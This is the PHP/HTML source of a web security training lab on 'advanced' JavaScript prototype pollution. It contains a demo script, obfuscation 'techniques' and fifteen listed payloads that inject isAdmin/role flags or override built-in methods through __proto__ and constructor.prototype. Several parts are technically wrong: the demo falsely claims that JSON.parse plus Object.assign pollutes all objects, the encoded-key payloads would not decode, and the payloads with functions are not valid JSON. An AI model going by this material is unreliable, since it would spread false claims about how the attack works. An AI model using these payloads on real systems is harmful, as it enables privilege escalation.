<?php
// Lab 4: Advanced Prototype Pollution
// Vulnerability: Advanced prototype pollution techniques and bypasses

session_start();

$message = '';
$result = '';

// Simulate prototype pollution processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['input'] ?? '';
    
    // Simulate vulnerable advanced processing
    if (!empty($input)) {
        // This simulates a vulnerable JavaScript-like environment
        $result = "Processing advanced input: " . htmlspecialchars($input);
        
        // Simulate prototype pollution detection
        if (strpos($input, '__proto__') !== false || strpos($input, 'constructor') !== false || strpos($input, 'prototype') !== false) {
            $message = '<div class="alert alert-danger">⚠️ Advanced Prototype Pollution detected! Input contains dangerous prototype properties.</div>';
        } else {
            $message = '<div class="alert alert-success">✅ Advanced processing completed successfully (no prototype pollution detected).</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced Prototype Pollution - Prototype Pollution Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-container {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-output {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 1rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        .advanced-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Prototype Pollution Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced Prototype Pollution</h1>
            <p class="hero-subtitle">Advanced prototype pollution techniques and bypasses</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced prototype pollution techniques that can be used to bypass modern protections and exploit sophisticated applications. These techniques include obfuscation, encoding, and various bypass methods.</p>
            <p><strong>Objective:</strong> Understand advanced prototype pollution techniques and how to bypass modern protections.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Application
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Advanced Data Processor</h5>
                            <p>This application processes complex data structures. Try to exploit advanced prototype pollution vulnerabilities:</p>
                            
                            <form method="POST">
                                <div class="mb-3">
                                    <label for="input" class="form-label">Complex Data Input</label>
                                    <textarea class="form-control" id="input" name="input" rows="8" placeholder='{"data": {"nested": {"value": "test"}}}'><?php echo isset($_POST['input']) ? htmlspecialchars($_POST['input']) : ''; ?></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">Process Data</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-gear me-2"></i>Advanced Prototype Pollution Tester
                    </div>
                    <div class="card-body">
                        <div class="advanced-warning">
                            <h5>⚠️ Advanced Prototype Pollution Warning</h5>
                            <p>This lab demonstrates advanced prototype pollution techniques:</p>
                            <ul>
                                <li><code>Obfuscation</code> - Code obfuscation techniques</li>
                                <li><code>Encoding</code> - Various encoding methods</li>
                                <li><code>Bypass Techniques</code> - Modern protection bypasses</li>
                                <li><code>Advanced Methods</code> - Complex attack vectors</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Advanced Attack Vectors</h5>
                            <p>These advanced techniques can be exploited for prototype pollution:</p>
                            <ul>
                                <li><code>Obfuscation</code> - Code obfuscation</li>
                                <li><code>Encoding</code> - Various encoding methods</li>
                                <li><code>Bypass Techniques</code> - Protection bypasses</li>
                                <li><code>Advanced Methods</code> - Complex attack vectors</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testAdvancedPrototypePollution()" class="btn btn-primary">Test Advanced Prototype Pollution</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Advanced Prototype Pollution Demo
                    </div>
                    <div class="card-body">
                        <div class="demo-container">
                            <h5>JavaScript Advanced Prototype Pollution Demonstration:</h5>
                            <p>This demonstrates advanced prototype pollution techniques:</p>
                            
                            <div class="demo-output">
// Advanced vulnerable function with obfuscation
function processData(data) {
    const obfuscated = JSON.parse(data);
    const result = Object.assign({}, obfuscated);
    return result;
}

// Obfuscated attacker input
const maliciousInput = '{"__proto__": {"isAdmin": true, "role": "admin"}}';

// Process the malicious input
const result = processData(maliciousInput);

// Now all objects have polluted prototype
console.log({}.isAdmin); // true
console.log({}.role); // "admin"

// Even new objects are affected
const newObj = {};
console.log(newObj.isAdmin); // true
                            </div>
                            
                            <div class="mt-3">
                                <small class="text-muted">The demo above shows how advanced techniques can lead to prototype pollution affecting all objects.</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Advanced Techniques
                    </div>
                    <div class="card-body">
                        <div class="advanced-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Obfuscation Techniques</div>
                                <div class="technique-demo">// String obfuscation
const key = String.fromCharCode(95, 95, 112, 114, 111, 116, 111, 95, 95);
// Base64 encoding
const encoded = btoa('__proto__');
// Unicode encoding
const unicode = '\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f';</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Encoding Methods</div>
                                <div class="technique-demo">// URL encoding
const urlEncoded = '%5F%5F%70%72%6F%74%6F%5F%5F';
// HTML encoding
const htmlEncoded = '&#95;&#95;&#112;&#114;&#111;&#116;&#111;&#95;&#95;';
// Hex encoding
const hexEncoded = '5f5f70726f746f5f5f';</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Bypass Techniques</div>
                                <div class="technique-demo">// Constructor bypass
const bypass = {
  constructor: {
    prototype: {
      isAdmin: true
    }
  }
};
// Nested bypass
const nested = {
  a: {
    __proto__: {
      isAdmin: true
    }
  }
};</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Advanced Methods</div>
                                <div class="technique-demo">// Function pollution
const func = {
  __proto__: {
    toString: function() { return 'hacked'; }
  }
};
// Array pollution
const arr = {
  __proto__: {
    push: function() { return 'hacked'; }
  }
};</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Prototype Chain</div>
                                <div class="technique-demo">// Deep prototype chain
const deep = {
  constructor: {
    prototype: {
      constructor: {
        prototype: {
          isAdmin: true
        }
      }
    }
  }
};</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Dynamic Properties</div>
                                <div class="technique-demo">// Dynamic property access
const prop = '__proto__';
const dynamic = {
  [prop]: {
    isAdmin: true
  }
};</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Processing Results
                    </div>
                    <div class="card-body">
                        <div class="result-display">
                            <h5>Processing Results:</h5>
                            <div id="processing-results"><?php echo $result ? $result : 'No input processed yet'; ?></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced Prototype Pollution</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> Advanced techniques</li>
                        <li><strong>Issue:</strong> Modern protection bypasses</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Obfuscation:</strong> Code obfuscation techniques</li>
                        <li><strong>Encoding:</strong> Various encoding methods</li>
                        <li><strong>Bypass Techniques:</strong> Protection bypasses</li>
                        <li><strong>Advanced Methods:</strong> Complex attack vectors</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced Prototype Pollution Examples</h5>
            <p>Use these techniques to exploit advanced prototype pollution vulnerabilities:</p>
            
            <h6>1. Obfuscated __proto__ Pollution:</h6>
            <div class="code-block">{
  "\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>2. Base64 Encoded Pollution:</h6>
            <div class="code-block">{
  "X19wcm90b19f": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>3. URL Encoded Pollution:</h6>
            <div class="code-block">{
  "%5F%5F%70%72%6F%74%6F%5F%5F": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>4. HTML Encoded Pollution:</h6>
            <div class="code-block">{
  "&#95;&#95;&#112;&#114;&#111;&#116;&#111;&#95;&#95;": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>5. Hex Encoded Pollution:</h6>
            <div class="code-block">{
  "5f5f70726f746f5f5f": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>6. String.fromCharCode Pollution:</h6>
            <div class="code-block">{
  "String.fromCharCode(95,95,112,114,111,116,111,95,95)": {
    "isAdmin": true,
    "role": "admin"
  }
}</div>

            <h6>7. Dynamic Property Pollution:</h6>
            <div class="code-block">{
  "constructor": {
    "prototype": {
      "isAdmin": true,
      "role": "admin"
    }
  }
}</div>

            <h6>8. Nested Constructor Pollution:</h6>
            <div class="code-block">{
  "constructor": {
    "prototype": {
      "constructor": {
        "prototype": {
          "isAdmin": true
        }
      }
    }
  }
}</div>

            <h6>9. Function Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { return "hacked"; },
    "valueOf": function() { return 0; }
  }
}</div>

            <h6>10. Array Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "push": function() { return "hacked"; },
    "length": 999
  }
}</div>

            <h6>11. Object Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "hasOwnProperty": function() { return true; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>12. Date Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "getTime": function() { return 0; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>13. String Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "charAt": function() { return "hacked"; },
    "length": 999
  }
}</div>

            <h6>14. Number Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "valueOf": function() { return 0; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>15. Boolean Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "valueOf": function() { return true; },
    "toString": function() { return "hacked"; }
  }
}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Advanced data manipulation and privilege escalation</li>
                <li>Complex application logic bypass</li>
                <li>Sophisticated authentication bypass</li>
                <li>Advanced Denial of Service (DoS) attacks</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation</li>
                    <li>Use Object.create(null) for safe objects</li>
                    <li>Implement proper input sanitization</li>
                    <li>Use Object.freeze() to prevent modifications</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual object behavior</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Educate developers about prototype pollution</li>
                    <li>Use safe parsing libraries</li>
                    <li>Implement proper error handling</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement proper logging and monitoring</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testAdvancedPrototypePollution() {
            document.getElementById('processing-results').innerHTML = 
                '<div class="alert alert-info">Advanced Prototype Pollution test initiated. Try the payload examples above.</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
